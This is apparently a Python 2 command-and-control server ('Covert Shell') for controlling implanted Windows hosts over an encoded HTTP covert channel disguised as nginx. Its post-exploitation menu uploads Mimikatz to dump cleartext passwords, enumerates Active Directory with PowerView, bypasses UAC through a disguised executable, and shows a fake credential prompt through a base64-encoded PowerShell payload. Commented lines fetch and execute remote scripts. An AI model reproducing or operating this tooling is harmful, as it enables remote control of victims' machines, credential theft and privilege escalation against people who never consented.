#!/usr/bin/env python
# -*- coding: utf-8 -*-
import SimpleHTTPServer
import SocketServer
import logging
import cgi
import sys
import covert_channel
import threading
import time
import readline,thread
import struct,fcntl,termios
import random
import binascii
import gen_binary
import socket
import os
from termcolor import colored
sys.dont_write_bytecode = True
os.system('clear')
print "" 
print colored(u"……[███ ","green") + colored(u"☠ ","red") + colored(u"███]▄▄▄▄▄▄▄▄▄▄▄▃","green")+colored(u"   ……[███ ","green") + colored(u"☠ ","red") + colored(u"███]▄▄▄▄▄▄▄▄▄▄▄▃","green") +colored(u"   ……[███ ","green") + colored(u"☠ ","red") + colored(u"███]▄▄▄▄▄▄▄▄▄▄▄▃","green") +colored(u"   ……[███ ","green") + colored(u"☠ ","red") + colored(u"███]▄▄▄▄▄▄▄▄▄▄▄▃","green")
print colored(u" ▄▅██ Dog █▅▄▃▂             ▄▅██ Potato █▅▄▃▂           ▄▅██ Everything's █▅▄▃▂      ▄▅██ Normal █▅▄▃▂","green")
print colored(u"I███████████████████]      I███████████████████]       I███████████████████]       I███████████████████]  ","green")
print colored(u"…◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤           …◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤             …◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤            …◥⊙▲⊙▲⊙▲⊙▲⊙▲⊙▲⊙◤","green")
print colored("                                             by cheetz","green")
global cmd2run
global sessions_list
cmd2run = ""
sessions_list = []

class ServerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    server_version = "nginx"
    sys_version = ""

    def do_GET(self):
	self.send_response(301)
	self.send_header('Location','http://www.google.com')
	self.end_headers()
	#self.wfile.write('')
    #    #print self.headers
    #    SimpleHTTPServer.SimpleHTTPRequestHandler.do_GET(self)

    def send_response(self, code, message=None):
        #self.log_request(code)
        if message is None:
            if self.responses.has_key(code):
                message = self.responses[code][0]
            else:
                message = ''
        if self.request_version != 'HTTP/0.9':
            self.wfile.write("%s %s %s\r\n" %
                             (self.protocol_version, str(code), message))
        self.send_header('Server', self.version_string())
        self.send_header('Date', self.date_time_string())

    def do_POST(self):
        global cmd2run
        global sessions_list
        responder = ""
        #logging.warning(self.headers)
        last_line = ""
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={'REQUEST_METHOD':'POST',
                     'CONTENT_TYPE':self.headers['Content-Type'],
                     })
        for item in form.list:
            if len(covert_channel.decode_string(form['value'].value)) > 1:
                c_response = covert_channel.decode_string(form['value'].value).strip()
                c_response_ignore = c_response.split(":",1)
                if (c_response_ignore[1].strip() == "ignore"):
                    responder = c_response_ignore[0].strip()
                else:
                    print covert_channel.decode_string(form['value'].value)
                    responded = covert_channel.decode_string(form['value'].value)
                    responder = responded.split(":",1)
                    responder = responder[0].strip()
                    sessions_list.append(responder)

                    results_file = open(responder + ".txt", "a")
                    results_file.write(responded + "\n")
                    results_file.close()
                    
            #logging.warning(item)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        junk = random.randint(0,100)
        if cmd2run == "":
            cmd2run = "ignore: asf" + str(junk)
        else:
            cmd2run_host = cmd2run.split(" ", 1)
            cmd2run = cmd2run_host[1]
            if cmd2run_host[0].lower() == responder.lower():
                self.wfile.write(covert_channel.encode_string(cmd2run))
        #self.wfile.write(covert_channel.encode_string(cmd2run))
        cmd2run = ""
        return

def blank_current_readline():
    # Next line said to be reasonably portable for various Unixes
    (rows,cols) = struct.unpack('hh', fcntl.ioctl(sys.stdout, termios.TIOCGWINSZ,'1234'))

    text_len = len(readline.get_line_buffer())+2

    # ANSI escape sequences (All VT100 except ESC[0G)
    sys.stdout.write('\x1b[2K')                         # Clear current line
    sys.stdout.write('\x1b[1A\x1b[2K'*(text_len/cols))  # Move cursor up and clear line
    sys.stdout.write('\x1b[0G')                         # Move to start of line


def noisy_thread():
    while True:
        time.sleep(2)
        blank_current_readline()
        #print 'Interrupting text!'
        sys.stdout.write('> ' + readline.get_line_buffer())
        sys.stdout.flush()          # Needed or text doesn't show until a key is pressed

def gen_bin(IP,PORT):
    IP = IP.strip()
    PORT = PORT.strip()
    gen_binary.generate_binary(IP,PORT)

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])

def file2hex(filename):
	f = open(filename,'rb')
	file_contents = f.read()
	string_hex = str(binascii.hexlify(file_contents)).strip()
	f.close()
	return string_hex


def post_exploit():
    print ""
    print colored("Welcome to Covert Shell - POST","green")
    print "Command Summary: "
    print "cmd [host] [command]				command to run on host"
    print "post [host] ad_users				pull all adusers and info from AD"
    print "post [host] password				if the executable was run as admin, pull cleartext passwords"
    print "post [host] password64				if the executable was run as admin, pull cleartext passwords for 64bit systems"
    print "post [host] get_computer_details		get all computer details"
    print "post [host] netview 				finds all machines on the local domain and runs various enumeration *takes a long time"
    print "post [host] win_patches 			list all windows hotfixes"
    print "post [host] list_processes 			detailed list information on running processes"
    print "post [host] list_users 				detailed list information on users"
    print "post [host] downloadfile [file] [location] 		send a file.  location is where to upload i.e. /Users/Public/"
    print "post [host] bypassuac32 			bypass UAC for 32bit OS"
    print "post [host] bypassuac 			bypass UAC for 64bit OS"
    print "post [host] pop_creds 				pop up a username/password box to capture credentials"
    print "calc host					calc calc calc calc"


def help():
    print ""
    print colored("Welcome to Covert Shell - MENU","green")
    print "Command Summary: "
    print "sessions					list all sessions"
    print "info [host]					print info about a specific host"
    print "cmd [host] kill					kill specific session"
    print "pwn						pwn host and return data *not working yet"
    print "sleep [command]					change the sleep commands"
    print "post [host] [command]				post exploitation commands. try post -h"
    print "generate_binary [ip] [port]			create client binary"
    print "exit						exit"



port_listening=80

Handler = ServerHandler
httpd = SocketServer.TCPServer(("", port_listening), Handler)

print colored("\n****************************","green")
print colored("*Starting Web Server","green")
print colored("*Listening on Port: ","green") + colored(str(port_listening),"red")
print colored("*Server IP: ","green") + colored(str(get_ip_address('eth0')),"red")
print colored("*Ready to accept connections","green")
print colored("****************************\n","green")
t = threading.Thread(target=httpd.serve_forever)
t.daemon = True
t.start()

thread.start_new_thread(noisy_thread, ())
while True:
    cmd_raw = raw_input('> ')
    if cmd_raw == "help" or cmd_raw == "-h":
        help()
        cmd2run = ""
    elif cmd_raw.startswith("cmd "):
        cmd2run = cmd_raw[4:]
    elif cmd_raw.startswith("calc "):
	post_split = cmd_raw.split(" ",2)
        cmd2run = post_split[1] + (" calc.exe &&" * 50) + " calc.exe"
    elif cmd_raw.startswith("info "):
	post_split = cmd_raw.split(" ",2)
        cmd2run = post_split[1] + " whoami /all && ipconfig /all && netstat -ano && net accounts && net localgroup administrators && net share"
    elif cmd_raw.startswith("post"):
	post_split = cmd_raw.split(" ",2)
	try:
		if len(post_split) > 1:
			if cmd_raw == "post -h":
       				post_exploit()
			elif post_split[2] == "ad_users":
				#cmd2run = post_split[1] + " " + "powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Veil-Framework/Veil-PowerView/master/powerview.ps1'); Get-UserProperties -Properties name,memberof,description,info"
				cmd2run = post_split[1] + " " + "downloadfile:" + 'powerview.ps1' + ":" + "/Users/Public/" + ":" + file2hex('powerview.ps1')
                        	time.sleep(5)
	                        cmd2run = post_split[1] + " " + "powershell -exec Bypass . C:\Users\Public\powerview.ps1; Get-UserProperties -Properties name,memberof,description,info"
        	                time.sleep(5)
                	        cmd2run = post_split[1] + " " + "del C:\Users\Public\powerview.ps1"
	
			elif post_split[2] == "password64":
				cmd2run = post_split[1] + " " + "downloadfile:" + 'mimikatz.ps1' + ":" + "/Users/Public/" + ":" + file2hex('mimikatz.ps1')
				time.sleep(5)
				cmd2run = post_split[1] + " " + "%systemroot%\sysnative\cmd.exe /c powershell -exec Bypass . C:\Users\Public\mimikatz.ps1; Invoke-Mimikatz -DumpCreds"
				time.sleep(5)
				cmd2run = post_split[1] + " " + "del C:\Users\Public\mimikatz.ps1"
			elif post_split[2] == "password":
				cmd2run = post_split[1] + " " + "downloadfile:" + 'mimikatz.ps1' + ":" + "/Users/Public/" + ":" + file2hex('mimikatz.ps1')
				time.sleep(5)
				cmd2run = post_split[1] + " " + "powershell -exec Bypass . C:\Users\Public\mimikatz.ps1; Invoke-Mimikatz -DumpCreds"
				time.sleep(5)
				cmd2run = post_split[1] + " " + "del C:\Users\Public\mimikatz.ps1"
			elif post_split[2] == "win_patches":
				cmd2run = post_split[1] + " " + "wmic qfe get Caption,HotFixID,description,installedOn"
			elif post_split[2] == "pop_creds":
				cmd2run = post_split[1] + " " + "powershell.exe -enc ZgB1AG4AYwB0AGkAbwBuACAAQwByAGUAZABlAG4AdABpAGEAbABzAAoAewAKADwAIwAKAC4AUwBZAE4ATwBQAFMASQBTAAoATgBpAHMAaABhAG4AZwAgAFAAYQB5AGwAbwBhAGQAIAB3AGgAaQBjAGgAIABvAHAAZQBuAHMAIABhACAAdQBzAGUAcgAgAGMAcgBlAGQAZQBuAHQAaQBhAGwAIABwAHIAbwBtAHAAdAAuAAoAKgBNAG8AZABpAGYAaQBlAGQAIAB0AG8AIABvAG4AbAB5ACAAcAByAGkAbgB0AAoALgBEAEUAUwBDAFIASQBQAFQASQBPAE4ACgBUAGgAaQBzACAAcABhAHkAbABvAGEAZAAgAG8AcABlAG4AcwAgAGEAIABwAHIAbwBtAHAAdAAgAHcAaABpAGMAaAAgAGEAcwBrAHMAIABmAG8AcgAgAHUAcwBlAHIAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABhAG4AZAAKAGQAbwBlAHMAIABuAG8AdAAgAGcAbwAgAGEAdwBhAHkAIAB0AGkAbABsACAAdgBhAGwAaQBkACAAYwByAGUAZABlAG4AdABpAGEAbABzACAAYQByAGUAIABlAG4AdABlAHIAZQBkACAAaQBuACAAdABoAGUAIABwAHIAbwBtAHAAdAAuAAoAVABoAGUAIABjAHIAZQBkAGUAbgB0AGkAYQBsAHMAIABjAGEAbgAgAHQAaABlAG4AIABlAHgAZgBpAGwAdAByAGEAdABlAGQAIAB1AHMAaQBuAGcAIABtAGUAdABoAG8AZAAgAG8AZgAgAGMAaABvAGkAYwBlAC4ACgAuAEUAWABBAE0AUABMAEUACgBQAFMAIAA+ACAAQwByAGUAZABlAG4AdABpAGEAbABzAAoALgBMAEkATgBLAAoAaAB0AHQAcAA6AC8ALwBsAGEAYgBvAGYAYQBwAGUAbgBlAHQAcgBhAHQAaQBvAG4AdABlAHMAdABlAHIALgBiAGwAbwBnAHMAcABvAHQALgBjAG8AbQAvAAoAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBzAGEAbQByAGEAdABhAHMAaABvAGsALwBuAGkAcwBoAGEAbgBnAAoAIwA+AAoACgBbAEMAbQBkAGwAZQB0AEIAaQBuAGQAaQBuAGcAKAApAF0ACgBQAGEAcgBhAG0AIAAoACkACgAkAGMAcgBlAGQAZQBuAHQAaQBhAGwAIAA9ACAAJABoAG8AcwB0AC4AdQBpAC4AUAByAG8AbQBwAHQARgBvAHIAQwByAGUAZABlAG4AdABpAGEAbAAoACIAQwByAGUAZABlAG4AdABpAGEAbABzACAAYQByAGUAIAByAGUAcQB1AGkAcgBlAGQAIAB0AG8AIABwAGUAcgBmAG8AcgBtACAAdABoAGkAcwAgAG8AcABlAHIAYQB0AGkAbwBuACIALAAgACIAUABsAGUAYQBzAGUAIABlAG4AdABlAHIAIAB5AG8AdQByACAAdQBzAGUAcgAgAG4AYQBtAGUAIABhAG4AZAAgAHAAYQBzAHMAdwBvAHIAZAAuACIALAAgACIAIgAsACAAIgAiACkACgAKACQAYwByAGUAZABzACAAPQAgACQAYwByAGUAZABlAG4AdABpAGEAbAAuAEcAZQB0AE4AZQB0AHcAbwByAGsAQwByAGUAZABlAG4AdABpAGEAbAAoACkACgBbAFMAdAByAGkAbgBnAF0AJAB1AHMAZQByACAAPQAgACQAYwByAGUAZABzAC4AdQBzAGUAcgBuAGEAbQBlAAoAWwBTAHQAcgBpAG4AZwBdACQAcABhAHMAcwAgAD0AIAAkAGMAcgBlAGQAcwAuAHAAYQBzAHMAdwBvAHIAZAAKAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAJAB1AHMAZQByAAoAVwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAkAHAAYQBzAHMACgB9AAoAQwByAGUAZABlAG4AdABpAGEAbABzAAoA"
				#cmd2run = post_split[1] + " " + "powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/powershell/master/creds.ps1'); Credentials"
			elif post_split[2] == "list_processes":
				cmd2run = post_split[1] + " " + "wmic process get caption,executablepath,commandline /format:csv"
			elif post_split[2] == "list_users":
				cmd2run = post_split[1] + " " + "wmic useraccount get /ALL /format:csv"
			elif post_split[2] == "netview":
				print "Please be patient, this will take a while"
				cmd2run = post_split[1] + " " + "downloadfile:" + 'powerview.ps1' + ":" + "/Users/Public/" + ":" + file2hex('powerview.ps1')
                        	time.sleep(5)
	                        cmd2run = post_split[1] + " " + "powershell -exec Bypass . C:\Users\Public\powerview.ps1; Invoke-Netview"
        	                time.sleep(60)
                	        cmd2run = post_split[1] + " " + "del C:\Users\Public\powerview.ps1"
				print "Still Running.  This will seriously take a long time."

				#cmd2run = post_split[1] + " " + "powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Veil-Framework/Veil-PowerView/master/powerview.ps1'); Invoke-Netview"
			elif post_split[2].startswith("downloadfile"):
				file_split = post_split[2].split(" ",2)
				fname = file_split[1].split("/")
				if len(fname) > 1:
					fname =  fname[len(fname)-1]
				else:
					fname = fname[0]
				try:
					cmd2run = post_split[1] + " " + "downloadfile:" + fname + ":" + file_split[2].strip() + ":" + file2hex(file_split[1].strip())
				except:
					print "File was not found"
					pass
			elif post_split[2].startswith("bypassuac32"):
                                cmd2run = post_split[1] + ' ' + 'tasklist /FI "IMAGENAME eq winword.exe"'
                                print "Getting Old Pid Number"
                                time.sleep(5)
                                cmd2run = post_split[1] + " " + "downloadfile:" + "winworder32.exe:" + "/Users/Public/" + ":" + file2hex("winworder32.exe")
                                print "uploading bypassuac"
                                time.sleep(15)
                                cmd2run = post_split[1] + " " + "C:\Users\Public\winworder32.exe elevate /c %CD%\winword.exe"
                                print "running bypassuac"
                                print "after successful connection, please kill old PID using: cmd " + post_split[1] + " taskkill /F /PID [PID]"
                                time.sleep(5)
                                cmd2run = post_split[1] + " " + "del C:\Users\Public\winworder32.exe && del C:\Users\Public\\tior.exe"

	                elif post_split[2].startswith("bypassuac"):
				cmd2run = post_split[1] + ' ' + 'tasklist /FI "IMAGENAME eq winword.exe"'
				print "Getting Old Pid Number"
				time.sleep(5)
	                        cmd2run = post_split[1] + " " + "downloadfile:" + "winworder.exe:" + "/Users/Public/" + ":" + file2hex("winworder.exe")
				print "uploading bypassuac"
				time.sleep(15)
				cmd2run = post_split[1] + " " + "C:\Users\Public\winworder.exe elevate /c %CD%\winword.exe"
				print "running bypassuac"
				print "after successful connection, please kill old PID using: cmd " + post_split[1] + " taskkill /F /PID [PID]"
				time.sleep(5)
				cmd2run = post_split[1] + " " + "del C:\Users\Public\winworder.exe && del C:\Users\Public\\tior.exe"
	
		else:
			post_exploit()
	except:
		post_exploit()
    elif cmd_raw == "sessions":
        for sess in set(sessions_list):
            print sess
    elif cmd_raw == "exit":
        httpd.shutdown()
        sys.exit(0)
    elif cmd_raw.startswith("generate_binary"):
	info = cmd_raw.split(" ")
        gen_bin(info[1],info[2])
    else:
        print "Types 'help' for list of commands"
        cmd2rum = ""
